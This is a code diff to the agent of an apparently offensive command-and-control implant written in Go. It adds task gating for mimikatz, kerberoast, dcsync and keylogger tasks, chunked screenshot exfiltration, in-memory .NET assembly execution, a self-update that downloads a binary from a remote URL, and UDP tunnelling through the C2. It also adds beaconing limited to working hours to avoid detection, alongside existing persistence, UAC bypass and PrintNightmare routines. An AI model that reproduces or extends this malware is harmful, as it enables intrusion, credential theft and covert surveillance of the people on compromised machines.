 		safeCmds := map[string]bool{
@@ -1046,6 +1377,27 @@ func executeTask(task Task) TaskResult {
 		}
 		if !safeCmds[task.Type] {
 			res.Error = "sandbox mode: blocked by sandbox detection"
+			return res
+		}
+	}
+
+	// Check environment restrictions from ops profile
+	if currentOpsProfile != nil {
+		switch {
+		case !currentOpsProfile.AllowShell && isShellTask(task.Type):
+			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
+			return res
+		case !currentOpsProfile.AllowInjection && isInjectTask(task.Type):
+			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
+			return res
+		case !currentOpsProfile.AllowCredDump && (task.Type == "mimikatz" || task.Type == "creds" || task.Type == "kerberoast" || task.Type == "lsa_bypass" || task.Type == "dcsync" || strings.HasPrefix(task.Type, "dpapi_")):
+			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
+			return res
+		case !currentOpsProfile.AllowKeylogger && (task.Type == "keylogger_start" || task.Type == "keylogger_dump"):
+			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
+			return res
+		case !currentOpsProfile.AllowScreenCapture && (task.Type == "screenshot" || task.Type == "screenshot_window" || task.Type == "screen_stream_start"):
+			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
 			return res
 		}
 	}
@@ -1114,6 +1466,45 @@ func takeScreenshotJPEG(quality int) ([]byte, error) {
 	return jpegBuf.Bytes(), nil
 }
 
+func takeScreenshotChunked(quality int) []TaskResult {
+	imgBytes, err := takeScreenshotJPEG(quality)
+	if err != nil {
+		return []TaskResult{{Error: err.Error()}}
+	}
+
+	if len(imgBytes) <= 2*1024*1024 {
+		return []TaskResult{{
+			Type:     "screenshot",
+			Output:   base64.StdEncoding.EncodeToString(imgBytes),
+			Encoding: "base64",
+			Size:     int64(len(imgBytes)),
+		}}
+	}
+
+	chunkSize := 256 * 1024
+	totalChunks := (len(imgBytes) + chunkSize - 1) / chunkSize
+	var results []TaskResult
+
+	for i := 0; i < totalChunks; i++ {
+		start := i * chunkSize
+		end := start + chunkSize
+		if end > len(imgBytes) {
+			end = len(imgBytes)
+		}
+		chunk := imgBytes[start:end]
+		results = append(results, TaskResult{
+			Type:     "screenshot_chunk",
+			Output:   base64.StdEncoding.EncodeToString(chunk),
+			Encoding: "base64",
+			Offset:   int64(i),
+			Size:     int64(totalChunks),
+			Filename: fmt.Sprintf("screenshot_%d_%d.jpg", i, totalChunks),
+		})
+	}
+
+	return results
+}
+
 func addPersistence() {
 	switch runtime.GOOS {
 	case "windows":
@@ -1172,17 +1563,11 @@ func killProcess(target string) (string, error) {
 }
 
 func clipboardGet() (string, error) {
-	if runtime.GOOS == "windows" {
-		return clipboardGetWindows()
-	}
-	return "", fmt.Errorf("clipboard not supported on this platform")
+	return clipboardGetWindows()
 }
 
 func clipboardSet(data string) error {
-	if runtime.GOOS == "windows" {
-		return clipboardSetWindows(data)
-	}
-	return fmt.Errorf("clipboard not supported on this platform")
+	return clipboardSetWindows(data)
 }
 
 func findFiles(path, pattern string) (string, error) {
@@ -1562,7 +1947,7 @@ func tryUACBypass(method, cmd string) error {
 	return nil
 }
 
-// ── execute-assembly: Load and run .NET assembly via PowerShell ────────────
+// ?? execute-assembly: Load and run .NET assembly ??????????????????????????
 func executeAssembly(b64Data string) (string, error) {
 	if b64Data == "" {
 		return "", fmt.Errorf("assembly data is required")
@@ -1570,6 +1955,21 @@ func executeAssembly(b64Data string) (string, error) {
 	if runtime.GOOS != "windows" {
 		return "", fmt.Errorf("execute-assembly is Windows-only")
 	}
+
+	// Use CLR hosting if available (no child process)
+	if useCLRHosting {
+		data, decErr := base64.StdEncoding.DecodeString(b64Data)
+		if decErr == nil {
+			out, clrErr := executeAssemblyInProcess(data, "")
+			if clrErr == nil {
+				return out, nil
+			}
+			if Debug {
+				fmt.Printf("[clr] CLR execute-assembly failed, falling back to PowerShell: %v\n", clrErr)
+			}
+		}
+	}
+
 	// PowerShell approach: convert base64 to bytes, load assembly, invoke entry point
 	psCmd := fmt.Sprintf(
 		`$b=[System.Convert]::FromBase64String('%s');`+
@@ -1584,7 +1984,7 @@ func executeAssembly(b64Data string) (string, error) {
 	return out, nil
 }
 
-// ── kerberoast: Request TGS for all SPNs (PowerShell + .NET) ──────────────
+// ?? kerberoast: Request TGS for all SPNs (PowerShell + .NET) ??????????????
 func kerberoast() (string, error) {
 	if runtime.GOOS != "windows" {
 		return "", fmt.Errorf("%s is Windows-only", s(SKerberoast))
@@ -1616,7 +2016,7 @@ Write-Output ($results -join [string]::NewLine());
 	return out, nil
 }
 
-// ── mimikatz: Run mimikatz command via PowerShell (Invoke-Mimikatz) ───────
+// ?? mimikatz: Run mimikatz command via PowerShell (Invoke-Mimikatz) ???????
 func runMimikatz(command string) (string, error) {
 	if runtime.GOOS != "windows" {
 		return "", fmt.Errorf("%s is Windows-only", s(SMimikatz))
@@ -1637,7 +2037,7 @@ func runMimikatz(command string) (string, error) {
 	return out, nil
 }
 
-// ── elevate_printnightmare: CVE-2021-1675 / CVE-2021-34527 ────────────────
+// ?? elevate_printnightmare: CVE-2021-1675 / CVE-2021-34527 ????????????????
 func elevatePrintNightmare(dllPath string) (string, error) {
 	if runtime.GOOS != "windows" {
 		return "", fmt.Errorf("printnightmare is Windows-only")
@@ -1691,8 +2091,29 @@ func deleteFileOrDir(path string) error {
 	return os.RemoveAll(path)
 }
 
-// selfUpdate downloads a new binary from URL and replaces the current process
-func selfUpdate(url string) string {
+// selfUpdate downloads a new binary from a signed URL and verifies its integrity
+func selfUpdate(cmdJSON string) string {
+	var params struct {
+		URL       string `json:"url"`
+		Signature string `json:"signature"`
+		PublicKey string `json:"public_key"`
+	}
+	if err := json.Unmarshal([]byte(cmdJSON), &params); err != nil {
+		return "failed to parse update command: " + err.Error()
+	}
+	if params.URL == "" {
+		return "self_update: download URL required"
+	}
+
+	signature, err := hex.DecodeString(params.Signature)
+	if err != nil {
+		return "failed to decode signature: " + err.Error()
+	}
+	publicKey, err := hex.DecodeString(params.PublicKey)
+	if err != nil {
+		return "failed to decode public key: " + err.Error()
+	}
+
 	exe, err := os.Executable()
 	if err != nil {
 		return "failed to get executable path: " + err.Error()
@@ -1705,7 +2126,7 @@ func selfUpdate(url string) string {
 		return "failed to create temp file: " + err.Error()
 	}
 
-	httpReq, err := http.NewRequest("GET", url, nil)
+	httpReq, err := http.NewRequest("GET", params.URL, nil)
 	if err != nil {
 		out.Close()
 		os.Remove(tmpPath)
@@ -1722,7 +2143,10 @@ func selfUpdate(url string) string {
 	}
 	defer resp.Body.Close()
 
-	written, err := io.Copy(out, resp.Body)
+	// Write binary and compute SHA-256 hash simultaneously
+	hasher := sha256.New()
+	tee := io.TeeReader(resp.Body, hasher)
+	written, err := io.Copy(out, tee)
 	out.Close()
 	if err != nil {
 		os.Remove(tmpPath)
@@ -1731,6 +2155,13 @@ func selfUpdate(url string) string {
 	if written == 0 {
 		os.Remove(tmpPath)
 		return "downloaded file is empty"
+	}
+
+	// Verify ed25519 signature of the SHA-256 hash
+	hash := hasher.Sum(nil)
+	if !ed25519.Verify(ed25519.PublicKey(publicKey), hash, signature) {
+		os.Remove(tmpPath)
+		return "signature verification failed: binary may be tampered"
 	}
 
 	// Make temp file executable (Linux)
@@ -1831,11 +2262,11 @@ func downloadFromURL(urlStr, destPath string) error {
 	return os.WriteFile(destPath, data, 0644)
 }
 
-// ═══════════════════════════════════════════════════════════════════════════════
+// ???????????????????????????????????????????????????????????????????????????????
 // SOCKS RELAY SUBSYSTEM (Agent Side)
 // Receives relay frames from C2 server via Beacon, dials actual targets,
 // and ferries data bidirectionally.
-// ═══════════════════════════════════════════════════════════════════════════════
+// ???????????????????????????????????????????????????????????????????????????????
 
 func socksProcessFrames(frames []socksFrame) {
 	for _, f := range frames {
@@ -1852,6 +2283,16 @@ func socksProcessFrames(frames []socksFrame) {
 			rportfwdWrite(f.ConnID, f.Data)
 		case "rportfwd_close":
 			rportfwdClose(f.ConnID)
+		case "tunnel_add":
+			tunnelAddRouteFromFrame(string(f.Data))
+		case "tunnel_remove":
+			tunnelRemoveRouteFromFrame(string(f.Data))
+
+		// UDP ASSOCIATE
+		case "udp_associate":
+			go socksHandleUDPAssociate(f.ConnID)
+		case "udp_data":
+			socksHandleUDPData(f.ConnID, f.Data)
 		}
 	}
 }
@@ -1862,7 +2303,7 @@ func socksHandleConnect(connID uint64, destAddr string) {
 		if Debug {
 			fmt.Printf("[socks] connect %s failed: %v\n", destAddr, err)
 		}
-		// Send close to orphan buffer – server will close operator TCP on receipt.
+		// Send close to orphan buffer ? server will close operator TCP on receipt.
 		// Always enqueue so operator connection doesn't hang.
 		socksRelayMu.Lock()
 		if len(socksOrphanOut) < socksOrphanMaxOut {
@@ -1883,7 +2324,7 @@ func socksHandleConnect(connID uint64, destAddr string) {
 		fmt.Printf("[socks] connected to %s (conn %d)\n", destAddr, connID)
 	}
 
-	// Read from target → buffer for server
+	// Read from target ? buffer for server
 	buf := make([]byte, 32*1024) // 32KB read chunks
 	for {
 		conn.SetReadDeadline(time.Now().Add(SocksReadTimeout))
@@ -1944,11 +2385,149 @@ func socksHandleClose(connID uint64) {
 		conn.tcpConn.Close()
 		conn.mu.Unlock()
 	}
+
+	// Also clean up UDP associations with the same ConnID
+	udpRelayMu.Lock()
+	uc, uok := udpRelayConns[connID]
+	if uok {
+		delete(udpRelayConns, connID)
+	}
+	udpRelayMu.Unlock()
+	if uok {
+		uc.mu.Lock()
+		uc.closed = true
+		uc.mu.Unlock()
+		uc.udpConn.Close()
+	}
+}
+
+// socksHandleUDPAssociate starts a local UDP listener on the agent for
+// relaying UDP datagrams through the C2 tunnel for the given association.
+func socksHandleUDPAssociate(connID uint64) {
+	udpConn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
+	if err != nil {
+		if Debug {
+			fmt.Printf("[socks] UDP ASSOCIATE listen failed: %v\n", err)
+		}
+		return
+	}
+
+	uc := &udpRelayConn{
+		connID:  connID,
+		udpConn: udpConn,
+	}
+
+	udpRelayMu.Lock()
+	udpRelayConns[connID] = uc
+	udpRelayMu.Unlock()
+
+	if Debug {
+		fmt.Printf("[socks] UDP ASSOCIATE started on port %d (conn %d)\n",
+			udpConn.LocalAddr().(*net.UDPAddr).Port, connID)
+	}
+
+	// Read goroutine: captures response datagrams from any target and
+	// sends them back to the server via the C2 tunnel.
+	buf := make([]byte, 65535)
+	go func() {
+		defer func() {
+			udpRelayMu.Lock()
+			if existing, ok := udpRelayConns[connID]; ok && existing == uc {
+				delete(udpRelayConns, connID)
+			}
+			udpRelayMu.Unlock()
+			udpConn.Close()
+		}()
+
+		for {
+			n, srcAddr, err := udpConn.ReadFromUDP(buf)
+			if err != nil {
+				return
+			}
+
+			payload := make([]byte, n)
+			copy(payload, buf[:n])
+
+			// Encode source address + payload and enqueue for server
+			encoded := encodeUDPFrameData(srcAddr.IP.String(), srcAddr.Port, payload)
+			socksEnqueueOut(connID, "udp_data", encoded)
+		}
+	}()
+}
+
+// socksHandleUDPData sends a UDP datagram to the target address specified in
+// the frame data. The response (if any) is captured by the read goroutine
+// started in socksHandleUDPAssociate.
+func socksHandleUDPData(connID uint64, data []byte) {
+	udpRelayMu.Lock()
+	uc, ok := udpRelayConns[connID]
+	udpRelayMu.Unlock()
+	if !ok || len(data) == 0 {
+		return
+	}
+
+	dstAddr, dstPort, payload, err := decodeUDPFrameData(data)
+	if err != nil {
+		if Debug {
+			fmt.Printf("[socks] UDP data decode error: %v\n", err)
+		}
+		return
+	}
+
+	dstUDPAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", dstAddr, dstPort))
+	if err != nil {
+		if Debug {
+			fmt.Printf("[socks] UDP resolve %s:%d failed: %v\n", dstAddr, dstPort, err)
+		}
+		return
+	}
+
+	uc.mu.Lock()
+	defer uc.mu.Unlock()
+	if uc.closed {
+		return
+	}
+
+	if _, err := uc.udpConn.WriteTo(payload, dstUDPAddr); err != nil {
+		if Debug {
+			fmt.Printf("[socks] UDP write to %s:%d failed: %v\n", dstAddr, dstPort, err)
+		}
+	}
+}
+
+// ── UDP Frame Binary Encoding ───────────────────────────────────────────────
+
+// encodeUDPFrameData encodes (addr, port, payload) into a binary blob for
+// SocksFrame.Data. Format: addrLen(2) + addr(N) + port(2) + payload.
+func encodeUDPFrameData(addr string, port int, payload []byte) []byte {
+	addrBytes := []byte(addr)
+	out := make([]byte, 2+len(addrBytes)+2+len(payload))
+	binary.BigEndian.PutUint16(out[0:2], uint16(len(addrBytes)))
+	copy(out[2:], addrBytes)
+	binary.BigEndian.PutUint16(out[2+len(addrBytes):], uint16(port))
+	copy(out[4+len(addrBytes):], payload)
+	return out
+}
+
+// decodeUDPFrameData reverses encodeUDPFrameData.
+func decodeUDPFrameData(data []byte) (addr string, port int, payload []byte, err error) {
+	if len(data) < 4 {
+		return "", 0, nil, fmt.Errorf("UDP frame data too short: %d bytes", len(data))
+	}
+	addrLen := int(binary.BigEndian.Uint16(data[0:2]))
+	if len(data) < 2+addrLen+2 {
+		return "", 0, nil, fmt.Errorf("UDP frame data truncated: need %d, have %d", 2+addrLen+2, len(data))
+	}
+	addr = string(data[2 : 2+addrLen])
+	port = int(binary.BigEndian.Uint16(data[2+addrLen : 4+addrLen]))
+	payload = data[4+addrLen:]
+	return
 }
 
 func socksEnqueueOut(connID uint64, action string, data []byte) {
 	frame := socksFrame{ConnID: connID, Action: action, Data: data}
 
+	// Check TCP connections first
 	socksRelayMu.Lock()
 	conn, ok := socksRelayConns[connID]
 	socksRelayMu.Unlock()
@@ -1960,7 +2539,18 @@ func socksEnqueueOut(connID uint64, action string, data []byte) {
 		return
 	}
 
-	// Connection not in map – control frames (close/connected) go to orphan buffer
+	// Check UDP associations for udp_data frames
+	if action == "udp_data" {
+		udpRelayMu.Lock()
+		udpOrphanOut = append(udpOrphanOut, frame)
+		if len(udpOrphanOut) > socksOrphanMaxOut {
+			udpOrphanOut = udpOrphanOut[1:]
+		}
+		udpRelayMu.Unlock()
+		return
+	}
+
+	// Connection not in map ? control frames (close/connected) go to orphan buffer
 	if action != "close" && action != "connected" {
 		return // drop data frames for unknown connections
 	}
@@ -1976,7 +2566,10 @@ func socksEnqueueOut(connID uint64, action string, data []byte) {
 // socksOrphanOut holds control frames for connections not in the map
 var socksOrphanOut []socksFrame
 
-// ── P2P Beacon Chaining ────────────────────────────────────────────────────────────
+// udpOrphanOut holds UDP data frames for UDP associations not tracked via TCP
+var udpOrphanOut []socksFrame
+
+// ?? P2P Beacon Chaining ????????????????????????????????????????????????????????????
 
 // sendP2PBeacon sends beacon request to parent agent via TCP or Named Pipe
 func sendP2PBeacon(body []byte) []byte {
@@ -2119,6 +2712,14 @@ func socksCollectOutbound() []socksFrame {
 	}
 	socksRelayMu.Unlock()
 
+	// Collect UDP orphan frames (udp_data for UDP associations)
+	udpRelayMu.Lock()
+	if len(udpOrphanOut) > 0 {
+		frames = append(frames, udpOrphanOut...)
+		udpOrphanOut = udpOrphanOut[:0]
+	}
+	udpRelayMu.Unlock()
+
 	// Collect from active connections (direct struct copy, no marshal/unmarshal)
 	socksRelayMu.Lock()
 	for _, conn := range socksRelayConns {
@@ -2132,4 +2733,72 @@ func socksCollectOutbound() []socksFrame {
 	socksRelayMu.Unlock()
 
 	return frames
+}
+
+// isWithinWorkingHours checks if the current time is within the configured working hours window.
+func isWithinWorkingHours() bool {
+	now := time.Now()
+	loc := loadWorkingTZ()
+	local := now.In(loc)
+
+	startTime, err := time.ParseInLocation("15:04", workingStart, loc)
+	if err != nil {
+		return true // malformed start, allow activity
+	}
+	endTime, err := time.ParseInLocation("15:04", workingEnd, loc)
+	if err != nil {
+		return true // malformed end, allow activity
+	}
+
+	currentMinutes := local.Hour()*60 + local.Minute()
+	startMinutes := startTime.Hour()*60 + startTime.Minute()
+	endMinutes := endTime.Hour()*60 + endTime.Minute()
+
+	if startMinutes <= endMinutes {
+		return currentMinutes >= startMinutes && currentMinutes < endMinutes
+	}
+	// Overnight window (e.g. 22:00-06:00)
+	return currentMinutes >= startMinutes || currentMinutes < endMinutes
+}
+
+// timeUntilNextWindow returns how long to sleep until the next working window opens.
+func timeUntilNextWindow() time.Duration {
+	now := time.Now()
+	loc := loadWorkingTZ()
+	local := now.In(loc)
+
+	startTime, err := time.ParseInLocation("15:04", workingStart, loc)
+	if err != nil {
+		return 5 * time.Minute // fallback
+	}
+	endTime, err := time.ParseInLocation("15:04", workingEnd, loc)
+	if err != nil {
+		return 5 * time.Minute
+	}
+	_ = endTime
+
+	startMinutes := startTime.Hour()*60 + startTime.Minute()
+	currentMinutes := local.Hour()*60 + local.Minute()
+
+	// Calculate how many minutes until start
+	var minutesUntilStart int
+	if startMinutes > currentMinutes {
+		minutesUntilStart = startMinutes - currentMinutes
+	} else {
+		minutesUntilStart = (24*60 - currentMinutes) + startMinutes
+	}
+
+	return time.Duration(minutesUntilStart) * time.Minute
+}
+
+// loadWorkingTZ loads the configured timezone or returns UTC.
+func loadWorkingTZ() *time.Location {
+	if workingTZ == "" {
+		return time.UTC
+	}
+	loc, err := time.LoadLocation(workingTZ)
+	if err != nil {
+		return time.UTC
+	}
+	return loc
 }
